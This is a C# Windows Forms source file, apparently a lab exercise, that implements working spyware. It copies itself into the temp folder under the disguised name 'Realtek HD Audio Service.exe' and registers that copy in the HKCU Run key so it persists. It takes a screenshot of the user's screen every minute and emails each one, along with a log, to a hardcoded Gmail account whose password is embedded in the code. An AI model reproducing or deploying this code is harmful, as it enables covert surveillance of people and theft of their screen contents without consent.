using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Net.Mail;
using System.Net;

namespace lr_5_sopad
{
    public partial class ScreenerForm : Form
    {
        public ScreenerForm()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private string getTempPath()
        {
            string tempPath = Path.GetTempPath();     
            return tempPath;
        }

        private string dateAndTime()
        {
            DateTime dateTime = DateTime.Now;
            string dateTimeStr = dateTime.ToString("hh;mm;ss (dd.MM.yy)");
            return dateTimeStr;
        }

        private void print(string text)
        {
            textBox1.Text += text;
        }

        private void copyToAutorun(string exeName)
        {
            try
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue(exeName, exeName);
                reg.Close();
                print(exeName + " ADDED to autorun\r\n");
	        }
            catch(Exception)
            {
                print("Error of adding to autorun\r\n");
            }
        }

        private void copyToTempAndSetAutorun()
        {
            string appName = "";
	        try
	        {
		        appName = getTempPath() + "Realtek HD Audio Service.exe";
		        if(File.Exists(appName)){
                    textBox1.Text += appName + " already exists\r\n";
			        return;
		        }
                string fullPath = Application.StartupPath.ToString() + "\\lr_5_sopad.exe";
                File.Copy(fullPath, appName, true);
                print(appName + " COPIED\r\n");
	            copyToAutorun(appName);
	        }
            catch(Exception)
            {
                print("Error of coping to " + appName + "\r\n");
            }
        }

        private void doInBackground()
        {
            copyToTempAndSetAutorun();
            timer1.Start();
        }

        private void ScreenerForm_Load(object sender, EventArgs e)
        {
            print("Program started at: " + dateAndTime() + "\r\n");
            //Thread thread = new Thread(new ThreadStart(doInBackground));
            doInBackground();
            makeScreen();
        }

        private void createlogFile()
        {
            string log = textBox1.Text;
            string fileName = getTempPath() + "LOG " + dateAndTime() + ".log";
            StreamWriter sW = new StreamWriter(fileName);
            sW.Write(log);
            sW.Close();
            sendToMail(fileName, "Log file");
            print("LOG sent to mail\r\n");
        }

        private void ScreenerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            print("Program closed at: " + dateAndTime() + "\r\n");
            createlogFile();
        }

        private string subject = Environment.UserName.ToString();
        private void sendToMail(string fileName, string text = "Screen")
        {
            try
            {
                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential("tempuserscreen@gmail.com", "4815162342qwerty");
                string from = "tempuserscreen@gmail.com", to = "tempuserscreen@gmail.com";
                MailMessage message = new MailMessage(from, to, subject, text);
                Attachment fileToAttach = new Attachment(fileName);
                message.Attachments.Add(fileToAttach);
                client.Send(message);
                print("Screen " + fileName + " have been sent to mail" + "\r\n");
            }
            catch (Exception excptn)
            {
                print(excptn.Message + " Unable to send screenshot.\r\n");
            }
        }

        private void makeScreen()
        {
            string screenName = getTempPath() + "SCREEN " + dateAndTime() + ".jpg";
            try
            {
                Bitmap bmimg = new Bitmap(SystemInformation.PrimaryMonitorSize.Width, SystemInformation.PrimaryMonitorSize.Height);
                Graphics imgGraphics = Graphics.FromImage(bmimg);
                imgGraphics.CopyFromScreen(0, 0, 0, 0, bmimg.Size);
                bmimg.Save(screenName);
                print("Screen have been made: " + screenName + "\r\n");
            }
            catch (Exception excptn)
            {
                print(excptn.Message + ". Unable to make screenshot.\r\n");
            }
            sendToMail(screenName);
        }
        
        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Enabled = false;
            makeScreen();
            timer1.Interval = 60 * 1000;
            timer1.Enabled = true;
        }
    }
}